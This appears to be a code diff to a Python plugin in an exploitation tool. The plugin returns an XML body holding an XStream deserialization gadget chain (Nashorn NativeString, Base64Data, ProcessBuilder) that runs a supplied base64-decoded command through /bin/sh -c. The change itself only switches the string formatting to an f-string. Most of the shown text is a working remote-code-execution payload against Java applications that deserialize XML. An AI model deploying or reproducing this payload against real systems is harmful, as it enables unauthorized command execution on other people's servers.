@@ -68,7 +68,7 @@ class Plugin(BasePlugin):
             try:
                 payload = base64.b64decode(payload).decode()
                 self.logger.debug('send payload with command: ' + payload)
-                xml = """<linked-hash-set>
+                xml = f"""<linked-hash-set>
   <jdk.nashorn.internal.objects.NativeString>
     <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
       <dataHandler>
@@ -82,7 +82,7 @@ class Plugin(BasePlugin):
                     <command>
                        <string>/bin/sh</string>
                        <string>-c</string>
-                       <string>%s</string>
+                       <string>{payload}</string>
                     </command>
                     <redirectErrorStream>false</redirectErrorStream>
                   </next>
@@ -106,7 +106,7 @@ class Plugin(BasePlugin):
       </dataHandler>
     </value>
   </jdk.nashorn.internal.objects.NativeString>
-</linked-hash-set>""" % payload
+</linked-hash-set>"""
                 return Response(xml, mimetype='application/xml')
 
             except Exception:
